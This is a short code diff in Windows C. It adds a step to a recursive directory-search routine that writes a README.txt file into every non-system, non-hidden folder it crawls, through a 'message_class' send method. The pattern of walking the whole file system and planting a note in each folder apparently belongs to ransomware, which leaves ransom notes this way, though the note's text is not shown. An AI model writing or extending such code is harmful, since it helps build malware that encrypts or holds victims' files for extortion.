@@ -226,8 +226,20 @@ static void search_engine_class_start(
 
             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
                 !(findData.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) &&
-                !(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN))
+                !(findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)) 
+            {
+                _TCHAR README[MAX_PATH + 0x01];
+                _tcscpy_s(README, _countof(README), currentFile);
+                _tcscat_s(README, _countof(README), _T("\\README.txt"));
+
+                message_class_t* message_class_obj = message_class_create(README);
+                if (message_class_obj)
+                {
+                    message_class_obj->method->m_send(message_class_obj);
+                    message_class_obj->method->m_destroy(message_class_obj);
+                }
                 search_engine_class_start(this, currentFile);
+            }
         } while (FindNextFile(hFind, &findData));
 
         FindClose(hFind);
